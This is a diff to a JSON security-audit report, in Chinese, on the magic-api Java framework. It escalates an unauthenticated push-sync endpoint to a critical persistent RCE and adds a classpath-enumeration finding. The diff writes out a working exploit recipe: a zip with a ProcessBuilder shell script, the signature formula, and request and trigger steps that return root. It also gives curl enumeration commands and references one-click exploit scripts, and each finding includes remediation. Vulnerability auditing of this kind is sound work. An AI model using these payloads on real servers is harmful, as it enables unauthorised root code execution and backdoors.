@@ -544,33 +544,37 @@
   },
   {
     "verdict": "confirmed",
-    "title": "推送接收接口签名无时效校验，可重放实现工作区整体替换",
+    "title": "推送接收接口鉴权开启后仍可未授权注入持久化 RCE 后门（签名无时效校验，可重放）",
     "severity": {
       "likelihood": {
-        "score": "low",
-        "reason": "仅当集成方配置 magic-api.secret-key（非空）时 receivePush 才注册；且攻击者需先截获一次合法推送流量（含 timestamp+sign）。"
+        "score": "medium",
+        "reason": "集群部署通常配置 secret-key（否则 receivePush 不注册）；secret-key 常为弱值且与登录密码独立，无需截获流量即可自行构造签名；鉴权模式下仍无需登录 token。"
       },
       "impact": {
-        "score": "high",
-        "reason": "重放历史合法推送包即可以 FULL 模式删除并替换整个工作区；配合 F1/F3 获取的旧脚本内容亦可构造签名（secretKey 除外），但签名依赖 secretKey，纯重放即可造成可用性破坏。"
+        "score": "critical",
+        "reason": "绕过 DefaultAuthorizationInterceptor 登录校验，注入含 ProcessBuilder 的 .ms 脚本 → uid=0(root) 命令执行；上传内容写入磁盘 resource location，重启存活，构成持久化后门。"
       },
-      "overall_severity": "medium"
+      "overall_severity": "critical"
     },
     "confidence": {
       "score": "high",
       "reason": "receivePush 源码明确仅做 sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes)) 等值校验，未比较 timestamp 与当前时间；SignUtils.sign 结构可读。"
     },
-    "description": "当配置了 magic-api.secret-key 时，MagicAPIAutoConfiguration 注册 POST /_magic-api-sync（pushPath 可配置）→ MagicWorkbenchController.receivePush。该方法校验 timestamp、mode、sign 非空，然后 sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes))，其中 SignUtils.sign = MD5(timestamp|mode|MD5(bytes)|secretKey)。**没有任何 timestamp 新鲜度检查**——一个被截获的合法推送请求（或其中间人/日志/代理留存）可被无限次重放，服务器每次都会执行 magicAPIService.upload(bytes, mode)，mode=FULL 时 DefaultMagicResourceService.upload(full=true) 先 root.delete() 清空全部 API 再写入攻击者重放的旧内容（其中可能包含 F1 注入的恶意脚本），造成配置回滚、后门持久化或服务破坏。签名材料中 secretKey 是唯一熵源，若 secretKey 弱（短/可猜）还可离线伪造任意推送。",
+    "description": "当配置 magic-api.secret-key 时，MagicAPIAutoConfiguration 注册 POST /_magic-api-sync → receivePush，标注 @Valid(requireLogin=false) —— 即使配置了 security.username/password，鉴权模式下该端点仍完全绕过登录校验，唯一保护是 sign.equals(MD5(timestamp|mode|MD5(bytes)|secretKey))。v2 动态实测：攻击者仅需知道 secretKey（与登录密码独立），构造 zip（api/pwn/group.json + api/pwn/evil.ms + 显式目录条目 api/、api/pwn/），ms 文件格式为 JSON + \"\\r\\n================================\\r\\n\" + script，以 mode=full 上传即清空工作区并写入任意 API 脚本；触发 GET /pwn/evil 返回 uid=0(root)；上传内容持久化于 resource location，容器重启后门仍存活。一键利用脚本 scripts/exploit_f07_push_rce.py。此外无 timestamp 新鲜度检查，截获的历史推送可无限重放。",
     "root_cause": "MagicWorkbenchController.receivePush 只验证签名等值而未验证 timestamp 新鲜度，允许重放历史推送请求。",
     "intended_behavior": "该接口用于集群节点间同步 API 定义，签名本应绑定时间戳并拒绝过期请求以防止重放。",
     "conditions": [
       {
         "kind": "system_configuration",
-        "description": "magic-api.secret-key 已配置（否则 receivePush 不注册）。"
+        "description": "magic-api.secret-key 非空（集群同步场景通常配置）；secretKey 与登录密码相互独立。"
       },
       {
-        "kind": "data_state",
-        "description": "攻击者需获得一次合法推送请求（网络截获、日志、代理缓存等）。"
+        "kind": "authentication_level",
+        "description": "无需任何登录凭证；鉴权模式（security.username/password 配置）不影响此端点。"
+      },
+      {
+        "kind": "network_routing",
+        "description": "攻击者可访问应用 HTTP 端口 /_magic-api-sync。"
       }
     ],
     "trace": [
@@ -579,40 +583,47 @@
         "file": "magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java",
         "line": 331,
         "scope": "receivePush",
-        "description": "POST /_magic-api-sync（multipart），参数 file/mode/timestamp/sign，@Valid(requireLogin=false)。"
+        "description": "POST /_magic-api-sync，@Valid(requireLogin=false)，鉴权模式下仍跳过登录校验，仅校验 sign 非空与等值。"
       },
       {
         "kind": "propagation",
         "file": "magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java",
         "line": 337,
         "scope": "receivePush",
-        "description": "isTrue(sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes)), SIGN_IS_INVALID) —— 无 timestamp 与当前时间差校验。"
+        "description": "sign.equals(SignUtils.sign(timestamp, secretKey, mode, bytes))——无 timestamp 新鲜度检查，secretKey 已知即可自行构造。"
       },
       {
         "kind": "propagation",
-        "file": "magic-api/src/main/java/org/ssssssss/magicapi/utils/SignUtils.java",
-        "line": 9,
-        "scope": "sign",
-        "description": "MD5(timestamp|mode|MD5(bytes)|secretKey)，历史请求的 (timestamp,mode,bytes,sign) 组合永远有效。"
+        "file": "magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java",
+        "line": 341,
+        "scope": "receivePush",
+        "description": "magicAPIService.upload(new ByteArrayInputStream(bytes), mode)，mode=full 时 full=true。"
       },
       {
         "kind": "sink",
-        "file": "magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java",
-        "line": 342,
-        "scope": "receivePush",
-        "description": "magicAPIService.upload(new ByteArrayInputStream(bytes), mode) —— FULL 模式清空并替换整个工作区。"
+        "file": "magic-api/src/main/java/org/ssssssss/magicapi/core/service/impl/DefaultMagicResourceService.java",
+        "line": 739,
+        "scope": "upload",
+        "description": "full=true 时 root.delete() 清空全部 API，再从 zip 读取 group/.ms 写盘并注册路由——攻击者 zip 中的 .ms 脚本（含 ProcessBuilder）落盘为可执行 API。"
       }
     ],
     "execution": {
-      "attacker_perspective": "能截获/读取一次节点间推送流量的中间人或日志读取者。",
+      "attacker_perspective": "知道（或猜中）magic-api.secret-key 的网络攻击者。无需登录 token，无需截获流量；鉴权开启与否均不影响。",
       "payloads": [
-        "重放完整 multipart POST /_magic-api-sync（timestamp、mode=FULL、sign、file 均用截获值）"
+        "zip 结构: api/ (显式目录条目) + api/pwn/ (显式目录条目) + api/pwn/group.json ({\"type\":\"api\",\"path\":\"pwn\",...}) + api/pwn/evil.ms (JSON + \"\\r\\n================================\\r\\n\" + script)",
+        "evil.ms script: import java.lang.ProcessBuilder; import java.util.Scanner; var p = new ProcessBuilder(\"/bin/sh\",\"-c\",\"id; hostname\").start(); var out = new Scanner(p.getInputStream()).useDelimiter(\"\\\\A\"); return out.hasNext() ? out.next() : \"\";",
+        "sign = MD5(timestamp|full|MD5(zipBytes)|secretKey)",
+        "POST /_magic-api-sync multipart: file=pwn.zip, mode=full, timestamp=<ms>, sign=<sig>  (无 Magic-Token)",
+        "触发: GET /pwn/evil  (无认证)"
       ],
       "instructions": [
-        "截获一次合法推送（或从日志/代理获取）。",
-        "原样重放 POST 请求，服务器接受并执行 upload(FULL)。"
+        "构造 zip，务必包含显式目录条目（ZipResource.dirs() 仅识别 endsWith(\"/\") 条目，漏加则静默 no-op）",
+        "计算 sign = MD5(timestamp|full|MD5(zipBytes)|secretKey)",
+        "POST /_magic-api-sync（无 token）→ 服务器 root.delete() 清空工作区并写入 zip 内容",
+        "GET /pwn/evil → 返回命令执行结果",
+        "重启服务后再 GET /pwn/evil 验证持久化"
       ],
-      "expected_result": "工作区被回滚为截获时的内容（全量删除+写入），重复重放可持续压制；可用性破坏与后门持久化。"
+      "expected_result": "GET /pwn/evil 返回 {\"code\":1,\"data\":\"uid=0(root) gid=0(root) groups=0(root)\\n<hostname>\"}；重启后仍可触发（后门持久化于 resource location）。动态实测通过，一键脚本 scripts/exploit_f07_push_rce.py。"
     },
     "remediation": {
       "strategy": "校验 timestamp 与服务器时间差（如 ±5 分钟）并缓存已见 sign 防重放；对 secretKey 长度/复杂度做强制校验。",
@@ -692,6 +703,83 @@
         {
           "file_name": "magic-api/src/main/java/org/ssssssss/magicapi/core/config/MagicCorsFilter.java",
           "fixed_code": "String value = request.getHeader(HttpHeaders.ORIGIN);\nif (StringUtils.isNotBlank(value) && allowedOrigins.contains(value)) {\n\tresponse.setHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN, value);\n\tresponse.setHeader(HttpHeaders.ACCESS_CONTROL_ALLOW_CREDENTIALS, Constants.CONST_STRING_TRUE);\n}"
+        }
+      ]
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "title": "未授权类路径枚举：/classes.txt 与 /classes 在鉴权模式下仍无需 token 可达",
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "端点标注 @Valid(requireLogin=false) 恒定生效，无论是否配置鉴权，一个 GET/POST 即可访问，无任何前提条件。"
+      },
+      "impact": {
+        "score": "medium",
+        "reason": "完整 classpath 枚举（实测 2298 个类，含 ProcessBuilder/Runtime/TemplatesImpl/JdbcRowSetImpl/InitialContext 等 RCE gadget）为 F-01 类 RCE 链构造提供精确侦察，组合利用显著降低攻击成本。"
+      },
+      "overall_severity": "medium"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "鉴权模式动态实测：无 token 请求两个端点均返回完整数据；源码 @Valid(requireLogin=false) 直接可读。"
+    },
+    "description": "MagicWorkbenchController 的 GET /magic/web/classes.txt 与 POST /magic/web/classes 标注 @Valid(requireLogin=false)，即使部署方配置了 magic-api.security.username/password（鉴权模式），未认证攻击者仍可获取服务器完整 Java classpath 及各类方法签名。实测 v2.2.2 返回 2298 个类，含 ProcessBuilder、Runtime、TemplatesImpl、JdbcRowSetImpl、InitialContext、URLClassLoader、ObjectInputStream、ScriptEngine 等 8 个 RCE gadget。与 F-01（magic-script 可 import 任意类）直接衔接：攻击者用 /classes 精确确认可用类后构造 RCE payload。一键脚本 scripts/poc_f09_classpath_enum.py。",
+    "root_cause": "MagicWorkbenchController 的 classes() 与 readClass() in magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java 标注 @Valid(requireLogin=false)，使 MagicWebRequestInterceptor.handle 跳过 getUserByToken 校验，允许未认证枚举服务器 classpath。",
+    "intended_behavior": "classpath 与方法签名信息仅供工作台编辑器代码提示使用，应仅对已登录的管理员开放。",
+    "conditions": [
+      {
+        "kind": "authentication_level",
+        "description": "无需任何凭证；默认配置与鉴权模式均受影响。"
+      },
+      {
+        "kind": "network_routing",
+        "description": "攻击者可访问应用 HTTP 端口 /magic/web/*。"
+      }
+    ],
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java",
+        "line": 94,
+        "scope": "readClass",
+        "description": "GET /classes.txt（@Valid(requireLogin=false) 于 line 96），返回 ClassScanner.compress 全量类列表。"
+      },
+      {
+        "kind": "propagation",
+        "file": "magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java",
+        "line": 112,
+        "scope": "classes",
+        "description": "POST /classes（@Valid(requireLogin=false) 于 line 114），返回 MagicScriptEngine.getScriptClassMap 与 modules 方法签名。"
+      },
+      {
+        "kind": "sink",
+        "file": "magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java",
+        "line": 115,
+        "scope": "classes",
+        "description": "响应体包含全部类名/方法/返回类型——未认证信息泄露。"
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "能访问应用 HTTP 端口的任意未认证攻击者（鉴权模式亦不拦截）。",
+      "payloads": [
+        "GET /magic/web/classes.txt",
+        "POST /magic/web/classes"
+      ],
+      "instructions": [
+        "curl http://target:9999/magic/web/classes.txt（无 token）→ 2298 行 classpath",
+        "curl -X POST http://target:9999/magic/web/classes（无 token）→ 含方法签名详情",
+        "python3 scripts/poc_f09_classpath_enum.py http://target:9999 → 自动检出 RCE gadget"
+      ],
+      "expected_result": "无 token 返回 2298 个类与 8 个 RCE gadget（ProcessBuilder 等）；鉴权模式下行为完全相同。"
+    },
+    "remediation": {
+      "strategy": "移除两处 @Valid(requireLogin=false)，使端点纳入登录校验；或生产部署直接关闭 classpath 信息端点。",
+      "code_changes": [
+        {
+          "file_name": "magic-api/src/main/java/org/ssssssss/magicapi/core/web/MagicWorkbenchController.java",
+          "fixed_code": "@GetMapping(value = \"/classes.txt\", produces = \"text/plain\")\n@ResponseBody\npublic String readClass() { ... }  // 移除 @Valid(requireLogin = false)\n\n@PostMapping(\"/classes\")\n@ResponseBody\npublic JsonBean<Map<String, Object>> classes() { ... }  // 移除 @Valid(requireLogin = false)"
         }
       ]
     }
